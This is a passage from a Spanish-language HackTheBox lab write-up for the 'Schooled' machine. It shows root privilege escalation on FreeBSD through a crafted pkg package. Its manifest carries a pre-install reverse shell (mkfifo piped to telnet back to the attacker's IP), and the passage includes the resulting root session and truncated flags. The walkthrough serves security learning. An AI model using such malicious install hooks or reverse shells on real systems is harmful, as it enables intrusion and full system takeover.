&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;jamie@Schooled:~/packages $ sudo pkg update
Updating FreeBSD repository catalogue...
Fetching meta.conf: 100%    &lt;span class=&#34;m&#34;&gt;163&lt;/span&gt; B   0.2kB/s    00:01    
Fetching packagesite.txz: 100%    &lt;span class=&#34;m&#34;&gt;932&lt;/span&gt; B   0.9kB/s    00:01    
Processing entries: 100%
FreeBSD repository update completed. &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; packages processed.
All repositories are up to date.
jamie@Schooled:~/packages $ sudo pkg install bash
Updating FreeBSD repository catalogue...
FreeBSD repository is up to date.
All repositories are up to date.
The following &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; package&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; will be affected &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;of &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; checked&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:

Installed packages to be UPGRADED:
        bash: 5.1.4 -&amp;gt; 7.1.4

Number of packages to be upgraded: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;

&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; MiB to be downloaded.

Proceed with this action? &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;y/N&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: y
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1/1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fetching bash-6.1.4.txz: 100%    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; MiB 127.4kB/s    00:12    
Checking integrity... &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; conflicting&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1/1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Upgrading bash from 5.1.4 to 7.1.4...
pkg: duplicate annotation: binary, ignoring
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1/1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Extracting bash-7.1.4:   0%
pkg: Directory //usr not specified in the manifest, skipping
pkg: Directory //usr/local not specified in the manifest, skipping
pkg: Directory //usr/local/man not specified in the manifest, skipping
pkg: Directory //usr/local/share not specified in the manifest, skipping
pkg: Directory //usr/local/libdata not specified in the manifest, skipping
pkg: Directory //usr/local/lib not specified in the manifest, skipping
pkg: Directory //usr/local/include not specified in the manifest, skipping
pkg: Directory //usr/local/bin not specified in the manifest, skipping
pkg: File //usr/local/bin/bashbug not specified in the manifest
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1/1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Extracting bash-7.1.4: 100%
jamie@Schooled:~/packages $
jamie@Schooled:~ $ ls -lah /home/jamie/root.txt 
-rw-r--r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root  jamie    33B Apr  &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; 10:18 /home/jamie/root.txt
jamie@Schooled:~ $ cat root.txt &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; cut -c1-15
269e8ad27983a7b
jamie@Schooled:~ $
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;shell---root&#34;&gt;Shell - Root&lt;/h2&gt;
&lt;p&gt;Utilizamos el mismo procedimiento para crear un nuevo paquete y repositorio, los cambios fueron en &lt;code&gt;+MANIFEST&lt;/code&gt; donde agregamos una shell inversa y una version mayor a la ya instalada, este ultimo se agrego en &lt;code&gt;+COMPACT_MANIFEST&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;scripts&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;s2&#34;&gt;&amp;#34;pre-install&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |telnet 10.10.14.145 1339 &amp;gt; /tmp/f&amp;#34;&lt;/span&gt;,
     ... , ...
  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tras instalar el paquete logramos obtener una shell como &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;╭─kali@kali ~/htb/schooled/repo2/packages  
╰─➤  rlwrap nc -lvvp &lt;span class=&#34;m&#34;&gt;1339&lt;/span&gt;
listening on &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;any&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1339&lt;/span&gt; ...
connect to &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.14.145&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; from schooled.htb &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.10.234&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;13002&lt;/span&gt;
whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;id&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
root
&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;wheel&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;wheel&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;operator&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/usr/home/jamie/packages
&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /root
ls
.cache
.cshrc
.history
.k5login
.lesshst
.login
.profile
.shrc
.ssh
root.txt
scripts
cat root.txt &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; cut -c1-15
269e8ad27983a7b
cat /home/jamie/user.txt &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; cut -c1-15
ecf7c6d61bfc9c8
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/schooled/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/schooled/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>moodle</category>
            
          
            
              <category>xss</category>
            
          
            
              <category>pkg</category>
            
          
            
              <category>pkg repo</category>
            
          
            
              <category>freebsd</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>freebsd</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      

    
  </channel>
</rss>